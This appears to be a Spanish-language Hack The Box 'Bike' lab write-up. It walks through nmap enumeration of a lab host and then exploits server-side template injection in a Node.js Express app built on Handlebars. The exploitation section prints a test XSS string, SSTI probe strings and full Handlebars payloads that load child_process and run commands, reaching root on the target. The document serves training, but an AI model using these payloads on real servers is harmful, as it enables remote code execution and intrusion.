---
title: Bike
layout: page
permalink: /Bike
---

<h2 class="titulo-principal">Bike</h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/Bike/bike.webp" alt="under" oncontextmenu="return false;">
</div>



Comenzamos encendiendo la máquina y nos da la dirección IP 10.129.166.121, enviaremos un paquete para saber a que nos estamos enfrentando:

```bash
❯ ping -c 5 10.129.166.121
PING 10.129.166.121 (10.129.166.121) 56(84) bytes of data.
64 bytes from 10.129.166.121: icmp_seq=1 ttl=63 time=115 ms
64 bytes from 10.129.166.121: icmp_seq=2 ttl=63 time=112 ms
64 bytes from 10.129.166.121: icmp_seq=3 ttl=63 time=109 ms
64 bytes from 10.129.166.121: icmp_seq=4 ttl=63 time=108 ms
64 bytes from 10.129.166.121: icmp_seq=5 ttl=63 time=111 ms
--- 10.129.166.121 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 108.120/110.928/115.225/2.492 ms
```

Con un TTL de 63 estamos frente a una máquina Linux.
# Enumeración

Para la fase de reconocimiento o enumeración lanzaremos un escaneo rápido y sigiloso con nmap sobre la dirección IP 10.129.166.121:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.166.121 -oG allPorts
```

![[HTB/Starting Point VIP/Tier 2/Bike/Images/nmap.png]]

Vemos dos puertos abiertos pero, para limpiar un poco el ruido de la captura de nmap usamos la herramienta previamente definida en la .zshrc **extractPorts**:

![[HTB/Starting Point VIP/Tier 2/Bike/Images/extractPorts.png]]

Vemos el puerto `22` y `80`, vamos a lanzar un escaneo con una serie de scripts básicos de reconocimiento con nmap para identificar la versión y servicio:

```bash
nmap -sCV -p22,80 10.129.166.121 -oN targeted
```

![[HTB/Starting Point VIP/Tier 2/Bike/Images/nmap2.png]]

Vemos puerto 22 SSH aunque sin credenciales por ahora será tenerlo en cuenta, y puerto 80 HTTP. Probamos con la herramienta whatweb a enumerar un poco este servicio:

![[HTB/Starting Point VIP/Tier 2/Bike/Images/whatweb.png]]

Solo encontramos que ejecuta Express, entonces haremos uso de un script programado en Lua para que nmap utilice un diccionario corto de rutas comunes para el servicio web:

```bash
nmap --script http-enum 10.129.166.121 -oN webScan
```

![[HTB/Starting Point VIP/Tier 2/Bike/Images/webscan.png]]

Pero no vemos nada relevante.

# Explotación

Abriremos la página y nos encontramos con tipo de desarrollo de juego estilo 'Among US' el cual nos esta pidiendo una dirección de correo para avisarnos cuando el servicio este listo.

![[HTB/Starting Point VIP/Tier 2/Bike/Images/web.png]]

En este punto podemos probar a explotar este campo 'Placeholder' intentando un XSS:

```html
<script>alert("XSS-gg-chat");</script>
```

Pero la página parece tener sanitizado XSS. Así que intentamos otra posibilidad capturando el tráfico web con Caido. Ya que si el campo no es vulnerable a XSS puede serlo a SSTI. Server Side Template Injection

---
# Explicación

¿Qué es Node.js?
Node.js es una plataforma de código abierto que permite como backend ejecutar JavaSscript para construir aplicativos.
¿Qué es Express?
Express es una versión minimalista de Node.js para aplicativos web.

![[stti0.png]]

Node.js y Python comúnmente hacen uso de algo llamado "Template Engines".
## ¿Qué es un Template Engine?

Template Engines son usados para generar automáticamente contenido web y ayudar al programador.

Template Engines son como todo software propensos a vulnerabilidades y en este caso Server Side Template Injection (SSTI).
## ¿Qué es un SSTI?
Server-side template injection es una vulnerabilidad que consiste en entrada maliciosa en un placeholder o campo de input en una template para ejecutar comandos en el server.

Este ataque es muy común en páginas Node.js.

![[stti1.png]]

Podemos probar las siguientes combinaciones para hacer el SSTI:

```js
{ {7*7}}
${7*7}
<%= 7*7 %>
${ {7*7}}
#{7*7
```

----

Capturamos con Caido el SSTI `{ {7*7}}` y lo convertimos a URL encode:

![[ssti.png]]

Hacemos un forward a la petición y vemos un mensaje de error por parte de la página y el servidor:

![[ssti2.png]]

Debería de ejecutar la operatorio '7 x 7' pero, en su lugar el mensaje de error muestra que si ha funcionado la inyección, y aparte de eso nos está mostrando 'root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler....'. Esto es bueno porque ahora sabemos que la plantilla se llama Handlebars.

> Aquí un muy buen recurso para indagar más en SSTI https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejsl


Donde como script para hacer pruebas a Node.js encontramos:

```js
{ {#with "s" as |string|}}
{ {#with "e"}}
{ {#with split as |conslist|}}
{ {this.pop}}
{ {this.push (lookup string.sub "constructor")}}
{ {this.pop}}
{ {#with string.split as |codelist|}}
{ {this.pop}}
{ {this.push "return require('child_process').exec('whoami');"}} ->>> nuestro comando a inyectar
{ {this.pop}}
{ {#each conslist}}
{ {#with (string.sub.apply 0 codelist)}}
{ {this}}
{ {/with}}
{ {/each}}
{ {/with}}
{ {/with}}
{ {/with}}
{ {/with}}
```

El cual debe ir en formato URL encode ya que viaja como parámetro en una petición web:

![[ssti3.png]]

Y vemos que hay un error en la linea 19 de la respuesta de Caido. Eso es porque Node.js trabaja con unas globales https://nodejs.org/api/globals.html. Pero que algunas funciones parecen ser también globales y son:

```js
__dirname
__filename
exports
module
require()
```

El problema es que necesitamos `require()` para poder ejecutar comandos pero no es una global. Podemos tratar a llamar una variable `process` para tener más información usando:

```js
{ {#with "s" as |string|}}
{ {#with "e"}}
{ {#with split as |conslist|}}
{ {this.pop}}
{ {this.push (lookup string.sub "constructor")}}
{ {this.pop}}
{ {#with string.split as |codelist|}}
{ {this.pop}}
{ {this.push "return process;"}} -->>>> process
{ {this.pop}}
{ {#each conslist}}
{ {#with (string.sub.apply 0 codelist)}}
{ {this}}
{ {/with}}
{ {/each}}
{ {/with}}
{ {/with}}
{ {/with}}
{ {/with}}
```

Lo pasamos a URL encode y vemos la respuesta:

![[ssti4.png]]

Se verifica la disponibilidad del objeto `process` en Node.js y el uso de su propiedad `mainModule`, esta propiedad aún puede ser utilizada para cargar el módulo principal y, desde allí, acceder a `require`.

```js
{ {#with "s" as |string|}}
{ {#with "e"}}
{ {#with split as |conslist|}}
{ {this.pop}}
{ {this.push (lookup string.sub "constructor")}}
{ {this.pop}}
{ {#with string.split as |codelist|}}
{ {this.pop}}
{ {this.push "return process.mainModule;"}}
{ {this.pop}}
{ {#each conslist}}
{ {#with (string.sub.apply 0 codelist)}}
{ {this}}
{ {/with}}
{ {/each}}
{ {/with}}
{ {/with}}
{ {/with}}
{ {/with}}
````

Se proporciona un payload en Handlebars para comprobar si `mainModule` es accesible. Tras enviarlo, la respuesta confirma que la propiedad está disponible. Luego, se modifica el payload para llamar a `require` y cargar el módulo `child_process`, que permite ejecutar comandos del sistema.

```js
{ {#with "s" as |string|}}
{ {#with "e"}}
{ {#with split as |conslist|}}
{ {this.pop}}
{ {this.push (lookup string.sub "constructor")}}
{ {this.pop}}
{ {#with string.split as |codelist|}}
{ {this.pop}}
{ {this.push "return process.mainModule.require('child_process');"}}
{ {this.pop}}
{ {#each conslist}}
{ {#with (string.sub.apply 0 codelist)}}
{ {this}}
{ {/with}}
{ {/each}}
{ /with}}
{ {/with}}
{ {/with}}
{ {/with}}
```

Finalmente, se confirma que `require` ha sido llamado con éxito y `child_process` ha sido cargado, lo que permite ejecutar comandos en el sistema:

![[ssti5.png]]

Le mandamos otra petición con un `whoami`:

```js
{ {#with "s" as |string|}}
{ {#with "e"}}
{ {#with split as |conslist|}}
{ {this.pop}}
{ {this.push (lookup string.sub "constructor")}}
{ {this.pop}}
{ {#with string.split as |codelist|}}
{ {this.pop}}
{ {this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
{ {this.pop}}
{ {#each conslist}}
{ {#with (string.sub.apply 0 codelist)}}
{ {this}}
{ {/with}}
{ {/each}}
{ {/with}}
{ {/with}}
{ {/with}}
{ {/with}}
```

![[ssti6.png]]

Ya siendo root podemos listar la flag:

![[HTB/Starting Point VIP/Tier 2/Bike/Images/intrusion.png]]
![[HTB/Starting Point VIP/Tier 2/Bike/Images/flag.png]]

<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/Bike/pwn.png" alt="under" oncontextmenu="return false;">
</div>

---

Esta publicación ha sido creada como soporte en mi formación académica y crecimiento profesional.

© Juan David Garcia Acevedo (aka liandd)
